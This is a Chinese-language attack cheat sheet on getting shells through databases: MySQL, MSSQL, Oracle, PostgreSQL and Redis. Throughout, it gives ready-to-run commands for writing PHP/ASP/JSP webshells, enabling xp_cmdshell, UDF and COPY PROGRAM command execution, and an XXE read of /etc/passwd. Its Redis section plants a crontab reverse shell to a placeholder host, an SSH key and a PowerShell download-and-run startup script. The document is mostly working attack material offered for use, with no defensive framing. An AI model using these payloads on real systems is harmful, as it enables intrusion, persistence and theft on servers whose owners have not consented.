# 数据库写文件与提权 Getshell 实战手册

## 1. MySQL 写文件 Getshell

### INTO OUTFILE / DUMPFILE
```sql
-- 探测 secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';
-- NULL=无限制, ''=任意, /path/=只能写该路径

-- 写webshell (路径需先确认)
SELECT '<?php system($_POST["x"]);?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 0x3C3F... INTO DUMPFILE '/var/www/html/shell.php'; -- hex写入,精确

-- 路径穿越绕过
SELECT 'xxx' INTO OUTFILE '../../htdocs/shell.php';
```

### 无FILE权限时绕过
```sql
-- general_log 写shell
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/www/shell.php';
SELECT '<?php system($_POST["x"]);?>';
SET GLOBAL general_log = 'OFF';

-- slow_query_log 写shell
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL slow_query_log_file = '/www/shell.php';
SELECT '<?php system($_POST["x"]);?>' FROM mysql.user WHERE SLEEP(11); -- 模拟慢查询
SET GLOBAL slow_query_log = 'OFF';
```

### UDF 提权
```
条件: MySQL以root运行, plugin_dir可写
步骤:
1. 找plugin_dir: SHOW VARIABLES LIKE 'plugin_dir';
2. 上传udf.dll/udf.so到plugin_dir
3. CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.dll';
4. SELECT sys_exec('net user hacker pass /add');

各OS UDF路径:
Linux 32: /usr/lib/mysql/plugin/
Linux 64: /usr/lib64/mysql/plugin/
Windows: C:/Program Files/MySQL/MySQL Server X.X/lib/plugin/
```

## 2. MSSQL 写文件与提权

### xp_cmdshell (最常见)
```sql
-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC master..xp_cmdshell 'whoami';

-- xp_cmdshell被删恢复
-- 方法1: 重新创建sp_OACreate
EXEC sp_addextendedproc xp_cmdshell, @dllname='xplog70.dll';

-- 方法2: COM对象
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @s INT; EXEC sp_oacreate 'wscript.shell', @s OUT;
EXEC sp_oamethod @s, 'run', NULL, 'cmd /c whoami';
```

### 差异备份写webshell
```sql
-- 先创建差异备份数据库
CREATE DATABASE test;
ALTER DATABASE test SET RECOVERY FULL;
CREATE TABLE test..shell(a image);
BACKUP DATABASE test TO DISK='c:\bak.bak' WITH INIT;
INSERT INTO test..shell(a) VALUES (0x3C3F706870...); -- hex webshell
BACKUP DATABASE test TO DISK='c:\inetpub\wwwroot\shell.asp' WITH DIFFERENTIAL, FORMAT;
DROP DATABASE test;
```

### log备份写webshell
```sql
ALTER DATABASE xxx SET RECOVERY FULL;
CREATE TABLE cmd(a image);
BACKUP LOG xxx TO DISK='c:\bak.log' WITH INIT;
INSERT INTO cmd(a) VALUES (0x3C3F...); -- hex
BACKUP LOG xxx TO DISK='c:\inetpub\shell.asp';
```

### 其他MSSQL手法
```
xp_regwrite: 写注册表自启动
CLR程序集: 导入C# DLL自定义执行
Agent Job: SQL Agent任务执行命令
外部脚本: sp_execute_external_script (SQL 2016+)
沙盒模式: sp_MSSetServerProperty (SQL 2000)
```

## 3. Oracle 写文件与提权

### UTL_FILE (需要DIRECTORY权限)
```sql
-- 查看可写目录
SELECT * FROM all_directories;
-- 创建目录
CREATE OR REPLACE DIRECTORY webdir AS '/www/htdocs';
-- 写文件
DECLARE f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('WEBDIR', 'shell.jsp', 'w');
  UTL_FILE.PUT_LINE(f, '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>');
  UTL_FILE.FCLOSE(f);
END;
/
```

### Java存储过程 (DBMS_JAVA)
```sql
-- 需要有JAVA权限
-- 写文件 via Java
SELECT DBMS_JAVA.grant_permission('USER', 'java.io.FilePermission', '/www/htdocs/shell.jsp', 'write') FROM dual;
-- 调用Java写文件的存储过程
```

### 外部预处理器执行 (Oracle外部表)
```sql
-- Oracle Text + 预处理器 = 命令执行
-- 需要 CTXSYS.CTX_DDL 权限
-- 通过 preprocessor 设置外部可执行文件
```

### Oracle XXE
```sql
SELECT EXTRACTVALUE(XMLTYPE('<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xxe>&xxe;</xxe>'),'/xxe') FROM dual;
```

## 4. PostgreSQL 写文件与RCE

### COPY PROGRAM (CVE-2019-9193, PG 9.3-11)
```sql
-- 需要超级用户或pg_execute_server_program权限
COPY (SELECT '') TO PROGRAM 'id';
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

### Large Object (lo_export)
```sql
-- 写文件
SELECT lo_import('/etc/passwd'); -- 导入到large object
SELECT lo_export(oid, '/tmp/passwd'); -- 导出large object到文件

-- 也可以用COPY TO写文件
COPY (SELECT 'shell content') TO '/tmp/shell.php';
```

### C语言函数 (UDF)
```sql
-- 编译.so
-- gcc -shared -fPIC -o pg_exec.so pg_exec.c -I `pg_config --includedir-server`
-- CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS TEXT AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
-- SELECT exec('id');
```

### PL/Python (若启用)
```sql
CREATE FUNCTION exec_py(cmd TEXT) RETURNS TEXT AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;
SELECT exec_py('id');
```

## 5. Redis Getshell

### 写crontab (Linux)
```bash
redis-cli -h target
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET xx "\n* * * * * bash -i >& /dev/tcp/x.x.x.x/9999 0>&1\n"
> SAVE
```

### 写SSH key (root)
```bash
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET xx "\nssh-rsa AAAAB3...\n"
> SAVE
```

### 主从复制RCE (Redis 4.x/5.x)
```bash
# 需要出网
# SLAVEOF x.x.x.x 6379
# 利用恶意Redis Master发送module
# 工具: RedisModules-ExecuteCommand
# MODULE LOAD /tmp/exp.so; system.exec 'id'
```

### 写webshell
```bash
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET xx "<?php system($_POST['x']);?>"
> SAVE
```

### Windows下
```bash
> CONFIG SET dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"
> CONFIG SET dbfilename shell.bat
> SET xx "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x/ps.ps1')"
> SAVE
```

## 6. 常见Web目录速查
| 环境 | Web目录 |
|------|---------|
| LNMP/LAMP | /var/www/html/ |
| 宝塔(BT) | /www/wwwroot/ |
| Tomcat | /usr/local/tomcat/webapps/ROOT/ |
| IIS | C:/inetpub/wwwroot/ |
| XAMPP | C:/xampp/htdocs/ |
| phpstudy | C:/phpstudy/WWW/ |
| wampserver | C:/wamp/www/ |
